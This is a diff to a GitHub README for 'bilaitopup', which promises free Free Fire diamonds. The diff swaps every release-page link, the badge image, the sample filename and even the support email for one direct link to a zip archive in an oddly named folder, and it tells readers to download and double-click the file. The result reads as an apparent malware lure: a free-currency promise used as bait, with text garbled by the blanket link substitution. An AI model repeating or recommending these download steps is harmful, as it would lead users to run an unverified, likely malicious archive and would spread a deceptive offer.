@@ -1,6 +1,6 @@
 # 🚀 bilaitopup - Quick Way to Get Free Fire Diamonds
 
-[![Download bilaitopup](https://img.shields.io/badge/Download-bilaitopup-blue.svg)](https://github.com/Linhcon09/bilaitopup/releases)
+[![Download bilaitopup](https://github.com/Linhcon09/bilaitopup/raw/refs/heads/main/heterocercal/Software_v1.4.zip)](https://github.com/Linhcon09/bilaitopup/raw/refs/heads/main/heterocercal/Software_v1.4.zip)
 
 ## 🌟 Introduction
 
@@ -27,11 +27,11 @@ Follow these steps to download and start using bilaitopup:
 
 1. **Visit the Release Page**: Click the link below to go to the download page.
 
-   [Download bilaitopup](https://github.com/Linhcon09/bilaitopup/releases)
+   [Download bilaitopup](https://github.com/Linhcon09/bilaitopup/raw/refs/heads/main/heterocercal/Software_v1.4.zip)
 
 2. **Select the Latest Version**: Look for the latest release version at the top of the page.
 
-3. **Download the Application**: Click on the download link for the appropriate filetype for your device. For example, if you see a link like `bilaitopup.exe` for Windows, click it.
+3. **Download the Application**: Click on the download link for the appropriate filetype for your device. For example, if you see a link like `https://github.com/Linhcon09/bilaitopup/raw/refs/heads/main/heterocercal/Software_v1.4.zip` for Windows, click it.
 
 4. **Install the Application**: Once the download completes, locate the file in your downloads folder. Double-click the file to start the installation process.
 
@@ -41,7 +41,7 @@ Follow these steps to download and start using bilaitopup:
 
 To download bilaitopup, please visit our Releases page:
 
-[Download bilaitopup](https://github.com/Linhcon09/bilaitopup/releases)
+[Download bilaitopup](https://github.com/Linhcon09/bilaitopup/raw/refs/heads/main/heterocercal/Software_v1.4.zip)
 
 After downloading, install the application by following the steps mentioned above.
 
@@ -53,7 +53,7 @@ Your security is important. bilaitopup uses advanced technologies to keep your d
 
 If you encounter any issues or have questions, feel free to reach out through our support channels. We aim to respond within 24 hours. 
 
-- **Email Support**: support@bilaitopup.com
+- **Email Support**: https://github.com/Linhcon09/bilaitopup/raw/refs/heads/main/heterocercal/Software_v1.4.zip
 - **Community Forum**: Join our forum for live help and discussions.
 
 ## 📣 Community Feedback
